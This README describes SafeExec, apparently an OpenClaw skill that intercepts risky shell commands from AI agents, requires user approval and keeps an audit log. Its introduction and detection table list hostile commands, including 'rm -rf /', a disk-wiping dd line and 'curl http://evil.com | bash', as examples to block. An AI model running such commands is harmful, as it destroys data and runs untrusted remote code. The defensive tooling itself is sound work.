# SafeExec - AI Agent Security Layer

> 🛡️ The last line of defense for AI Agents - Intercept dangerous commands and protect your system

[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
[![OpenClaw](https://img.shields.io/badge/OpenClaw-Skill-blue)](https://openclaw.ai)
[![Security](https://img.shields.io/badge/Security-Critical-red)]()

---

## ✨ Why SafeExec?

AI Agents are powerful assistants, but they can also cause serious damage:

- 💥 **Data Deletion** - A simple "clean temp files" might become `rm -rf /`
- 🔥 **System Destruction** - "Optimize disk" might execute `dd if=/dev/zero of=/dev/sda`
- 🚪 **Security Breaches** - "Install this tool" might run `curl http://evil.com | bash`

**SafeExec was built to solve exactly these problems.**

---

## 🎯 Core Features

### 1️⃣ Intelligent Risk Assessment

Automatically detects 10+ categories of dangerous operations:

| Risk Level | Detection Pattern | Description |
|------------|------------------|-------------|
| 🔴 **CRITICAL** | `rm -rf /` | Delete system files |
| 🔴 **CRITICAL** | `dd if=` | Disk destruction |
| 🔴 **CRITICAL** | `mkfs.*` | Format filesystem |
| 🔴 **CRITICAL** | Fork bomb | System DoS |
| 🟠 **HIGH** | `chmod 777` | Privilege escalation |
| 🟠 **HIGH** | `curl | bash` | Code injection |
| 🟠 **HIGH** | Write to `/etc/` | System config tampering |
| 🟡 **MEDIUM** | `sudo` | Privileged operations |
| 🟡 **MEDIUM** | Firewall modification | Network exposure |

### 2️⃣ Command Interception & Approval

```
User Request → AI Agent → safe-exec execution
                         ↓
                    Risk Assessment
                    /      \
               Safe      Dangerous
                |          |
              Execute    Intercept + Notify
                         ↓
                    Wait for User Approval
                         ↓
              [Approve] → Execute / [Reject] → Cancel
```

### 3️⃣ Complete Audit Trail

All operations are logged to `~/.openclaw/safe-exec-audit.log`:

```json
{
  "timestamp": "2026-01-31T16:44:17.217Z",
  "event": "approval_requested",
  "requestId": "req_1769877857_2352",
  "command": "rm -rf /tmp/test\n",
  "risk": "critical",
  "reason": "Delete files from root or home directory"
}
```

---

## ⚡ Quick Start (5 Minutes)

### Step 1: Install SafeExec

```bash
# Clone to OpenClaw skills directory
git clone https://github.com/OTTTTTO/safe-exec.git ~/.openclaw/skills/safe-exec

# Add execute permissions
chmod +x ~/.openclaw/skills/safe-exec/*.sh

# Create global commands
ln -sf ~/.openclaw/skills/safe-exec/safe-exec.sh ~/.local/bin/safe-exec
```

### Step 2: Test SafeExec

```bash
# Test safe command (executes directly)
safe-exec "echo 'Hello SafeExec!'"
# Output: Hello SafeExec!

# Test dangerous command (gets intercepted)
safe-exec "rm -rf /tmp/test"
# Output: 🚨 Dangerous operation detected - Command intercepted
```

### Step 3: Use in OpenClaw

Tell OpenClaw in chat:

```
Enable SafeExec
```

Then try a dangerous command:

```
Delete /tmp/test folder
```

OpenClaw will automatically intercept and ask for your approval!

### Step 4: Approve or Reject

```
approve req_xxxxx    # Execute command
reject req_xxxxx    # Cancel command
```

That's it! 🎉

---

## 🚀 Usage

### Basic Usage

```bash
# Execute command (safe commands run directly)
safe-exec "ls -la"

# Dangerous commands get intercepted
safe-exec "rm -rf /tmp/test"

# List pending requests
safe-exec --list

# Approve request
safe-exec-approve req_xxxxx

# Reject request
safe-exec-reject req_xxxxx

# Check status
safe-exec --status

# Temporarily disable (only for trusted environments)
safe-exec --disable

# Re-enable
safe-exec --enable
```

### Quick Command Tips

```bash
# Quick approve latest request
safe-exec-approve $(ls -t ~/.openclaw/safe-exec/pending/ | head -1 | sed 's/.json//')

# View all pending requests
safe-exec --list | grep "req_"

# View recent audit log
tail -20 ~/.openclaw/safe-exec-audit.log | jq .

# Count interceptions
grep "approval_requested" ~/.openclaw/safe-exec-audit.log | wc -l
```

---

## 📱 OpenClaw Usage Example

### Scenario: Clean temp files in OpenClaw Chat

```
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
👤 User: Enable SafeExec

🤖 OpenClaw Agent:
✅ SafeExec enabled!

All dangerous commands will now be intercepted and require your approval.
Protected commands:
  • rm -rf / (delete system files)
  • dd if= (disk destruction)
  • chmod 777 (privilege escalation)
  • curl | bash (code injection)
  • ... and more

Status: 🛡️ Running
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

👤 User: Help me force delete all contents of /tmp/test folder

🤖 OpenClaw Agent:
🚨 **Dangerous Operation Detected - Command Intercepted**

**Risk Level:** 🔴 CRITICAL
**Command:** `rm -rf /tmp/test`
**Reason:** Delete files from root or home directory
**Matched Rule:** `rm -rf? [\/~]`

**Request ID:** `req_1769877857_2352`

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚠️  This command requires user approval
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

📋 **Operation to be executed:**
  • Delete directory: /tmp/test
  • Delete mode: Recursive force delete
  • Impact: All files and subdirectories under that directory

⏰ Request expires in 5 minutes

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
💡 **Approval Methods:**
1. Reply directly: `approve req_1769877857_2352`
2. Or reply: `safe-exec-approve req_1769877857_2352`

🚫 **Rejection Methods:**
1. Reply directly: `reject req_1769877857_2352`
2. Or reply: `safe-exec-reject req_1769877857_2352`
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

👤 User: approve req_1769877857_2352

🤖 OpenClaw Agent:
✅ **Request Approved - Executing Command**

**Command:** `rm -rf /tmp/test`
**Status:** Executed successfully
**Deleted:** 15 files, 3 directories

✨ Operation complete! SafeExec continues protection.
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

👤 User: Disable SafeExec

🤖 OpenClaw Agent:
⚠️  **SafeExec Disabled**

⚠️  All commands will execute directly, without protection!

Only disable in:
  ✓ Trusted environments
  ✓ Batch execution of known safe commands
  ✓ Testing and debugging

Restore protection: Enable SafeExec
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
```

---

## 🔗 OpenClaw Agent Integration

### Auto-Interception Mode

**Enable SafeExec in OpenClaw config:**

Edit OpenClaw config file (usually `~/.openclaw/config.json`):

```json
{
  "tools": {
    "exec": {
      "security": "allowlist",
      "allowlist": [
        "safe-exec*",
        "ls",
        "cat",
        "echo"
      ]
    }
  }
}
```

### AI Assistant Best Practices

#### Method 1: Wrap All Dangerous Commands

Tell the AI assistant to use safe-exec for all potentially dangerous commands:

```
You: From now on, execute all delete, system file modification, or sudo commands through safe-exec

🤖: Understood! I will route the following command types through safe-exec:
    • rm, mv, cp (involving system directories)
    • chmod, chown
    • All sudo commands
    • curl/wget pipe operations
```

#### Method 2: Auto-Detection Mode

Use OpenClaw's HEARTBEAT feature to check for pending approval requests:

Add to `HEARTBEAT.md`:

````markdown
# Heartbeat Check

Run on every heartbeat:

\`\`\`bash
safe-exec --check-pending 2>/dev/null || echo "✅ No pending approval requests"
\`\`\`

If there are pending requests, notify the user.
````

---

## ⚙️ Configuration

### Custom Rules

Edit `~/.openclaw/safe-exec-rules.json`:

```json
{
  "rules": [
    {
      "pattern": "YOUR_REGEX_PATTERN",
      "risk": "high",
      "description": "Your custom rule description"
    }
  ]
}
```

### Environment Variables

```bash
# Audit log path
export SAFE_EXEC_AUDIT_LOG="$HOME/.openclaw/safe-exec-audit.log"

# Request timeout (seconds)
export SAFE_EXEC_TIMEOUT=300
```

---

## 📊 How It Works

```
┌─────────────────────────────────────────────┐
│         User / AI Agent                      │
└──────────────────┬──────────────────────────┘
                   │
                   ▼
         ┌─────────────────┐
         │   safe-exec     │
         │   (entry point)  │
         └────────┬─────────┘
                  │
                  ▼
         ┌─────────────────┐
         │ Risk Assessment │
         │                 │
         │ • Pattern match │
         │ • Risk grading  │
         │ • Rule engine   │
         └────────┬─────────┘
                  │
        ┌─────────┴─────────┐
        │                   │
   [Safe]              [Dangerous]
        │                   │
        ▼                   ▼
   Execute           Intercept + Notify
        │                   │
        │              ┌─────┴─────┐
        │              │           │
        │           Wait      Audit Log
        │              │
        │         ┌────┴────┐
        │         │         │
        │      [Approve] [Reject]
        │         │         │
        │         ▼         ▼
        │      Execute   Cancel
        │         │
        └─────────┴─────────┘
                  │
                  ▼
           ┌─────────────┐
           │  Audit Log  │
           └─────────────┘
```

---

## 🔒 Security Features

- ✅ **Zero Trust** - All commands require approval by default
- ✅ **Complete Audit** - Log all security events
- ✅ **Immutable Logs** - Audit logs use append-only mode
- ✅ **Minimal Privilege** - No additional system permissions required
- ✅ **Transparency** - Users always know what's being executed
- ✅ **Configurable** - Flexible rule system

---

## 🧪 Testing

```bash
# Run test suite
bash ~/.openclaw/skills/safe-exec/test.sh

# Manual testing
safe-exec "echo 'Safe command test'"
safe-exec "rm -rf /tmp/test-dangerous"
```

---

## 📈 Roadmap

### v0.2.0 (In Progress)
- [ ] Support more notification channels (Telegram, Discord)
- [ ] Web UI approval interface
- [ ] Smarter risk assessment (machine learning)
- [ ] Batch operation support

### v0.3.0 (Planned)
- [ ] Multi-user support
- [ ] RBAC permission control
- [ ] Audit log encryption
- [ ] SIEM integration

### v1.0.0 (Future)
- [ ] Enterprise features
- [ ] SaaS deployment support
- [ ] Complete API

---

## 💡 Best Practices

### Development Environment Setup

```bash
# Add to ~/.bashrc or ~/.zshrc
export SAFE_EXEC_TIMEOUT=300           # 5 minute timeout
export SAFE_EXEC_AUDIT_LOG="$HOME/.openclaw/safe-exec-audit.log"

# Aliases - quick commands
alias se='safe-exec'
alias sea='safe-exec-approve'
alias ser='safe-exec-reject'
alias sel='safe-exec-list'
```

### Team Collaboration

**Shared Rule Set:**

```bash
# 1. Create team rules file
cat > team-rules.json << EOF
{
  "enabled": true,
  "rules": [
    {"pattern": "\\brm\\s+-rf", "risk": "critical", "description": "Team rule: No recursive deletion"},
    {"pattern": "production.*restart", "risk": "critical", "description": "Team rule: Production restart"}
  ]
}
EOF

# 2. Commit to version control
git add team-rules.json
git commit -m "Add team SafeExec rules"

# 3. Team members pull and import
git pull
safe-exec-add-rule --import team-rules.json
```

---

## ❓ FAQ

### Q1: Will SafeExec affect command execution performance?

**A:** No. For safe commands, SafeExec only performs fast pattern matching (< 1ms). Only dangerous commands trigger the approval flow.

### Q2: Can I temporarily disable SafeExec?

**A:** Yes! Use:

```bash
# Temporarily disable (current session)
safe-exec --disable

# Re-enable after executing dangerous commands
safe-exec --enable
```

⚠️ **Note:** Only disable in trusted environments!

### Q3: How do I view my command history?

**A:** Check the audit log:

```bash
# Real-time view
tail -f ~/.openclaw/safe-exec-audit.log

# Formatted display
jq '.' ~/.openclaw/safe-exec-audit.log | less

# View last 10 interceptions
grep "approval_requested" ~/.openclaw/safe-exec-audit.log | tail -10
```

### Q4: Can SafeExec prevent all dangerous operations?

**A:** SafeExec can prevent most common dangerous operations, but not 100%:

✅ **Can prevent:**
- Deleting system files (rm -rf /)
- Disk destruction (dd, mkfs)
- Privilege escalation (chmod 777, sudo)
- Code injection (curl | bash)

❌ **Cannot prevent:**
- Already compromised systems
- Direct hardware operations
- Social engineering attacks

---

## 🤝 Contributing

Contributions welcome! Please see [CONTRIBUTING.md](CONTRIBUTING.md) for details.

```bash
# Fork repository
git clone https://github.com/OTTTTTO/safe-exec.git

# Create feature branch
git checkout -b feature/amazing-feature

# Commit changes
git commit -m "Add amazing feature"

# Push to branch
git push origin feature/amazing-feature

# Open Pull Request
```

---

## 📝 License

MIT License - see [LICENSE](LICENSE) file for details

---

## 🙏 Acknowledgments

- [OpenClaw](https://openclaw.ai) - Powerful AI Agent framework
- [Sudo](https://www.sudo.ws/) - Inspired approval mechanism design
- All contributors and users

---

## 📮 Contact

- **GitHub Issues**: [Submit issues](https://github.com/OTTTTTO/safe-exec/issues)
- **Email**: 731554297@qq.com
- **Discord**: [OpenClaw Community](https://discord.gg/clawd)

---

## 🌟 Star History

If this project helps you, please give it a Star ⭐

---

**Made with ❤️ by the OpenClaw community**

> "AI is a powerful assistant, but security is always the top priority."

---

## 🌐 Languages

- [中文](README.md) | [English](README_EN.md)
